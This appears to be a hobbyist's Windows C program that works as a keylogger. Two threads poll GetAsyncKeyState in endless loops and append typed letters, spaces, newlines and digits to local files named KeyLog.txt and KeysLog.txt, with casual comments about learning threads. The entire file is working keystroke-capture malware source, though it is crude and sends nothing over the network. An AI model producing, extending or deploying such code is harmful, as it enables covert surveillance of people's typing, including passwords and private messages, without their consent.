#include <windows.h>
#include <stdio.h>
#include <unistd.h>

DWORD WINAPI Letters(LPVOID lpParam){
    int keys;
    FILE *document;

    while(1) {
        document = fopen("KeyLog.txt","a");
        for(keys = 64; keys <= 90; keys++){

            if(GetAsyncKeyState(keys) == -32767)
                fprintf(document,"%c",keys); // insert letters
            
            if(GetAsyncKeyState(0x20) == -32767)
                fprintf(document," "); // insert space
            
            if(GetAsyncKeyState(VK_RETURN)){
                fprintf(document,"\n"); // next line
                sleep(1);
            }
        }
        fclose(document); //This fclose in each loop is for realtime registers
    }
}

DWORD WINAPI Numbers(LPVOID lpParam) {
    int keys;
    FILE *document;

    while(1) {
        document = fopen("KeysLog.txt","a");
        for (keys = 0x30; keys <= 0x39; keys++) {
            if (GetAsyncKeyState(keys)) {
                fprintf(document,"%c",((char)keys)); // convert int to char // example 0x30 -> 0
                sleep(1); // idk why but without sleep is place a lot of the same number
            }
        }
        fclose(document);
    }
}

int main(){
    HANDLE hThread1, hThread2;
    DWORD threadID1, threadID2;
    //I don't even know how to use thread lmao
    //Apparently thread make things faster and make parallel processing
    hThread1 = CreateThread(NULL, 0, Letters, NULL, 0, &threadID1);
    hThread2 = CreateThread(NULL, 0, Numbers, NULL, 0, &threadID2);

    WaitForSingleObject(hThread1, INFINITE);
    WaitForSingleObject(hThread2, INFINITE);
}
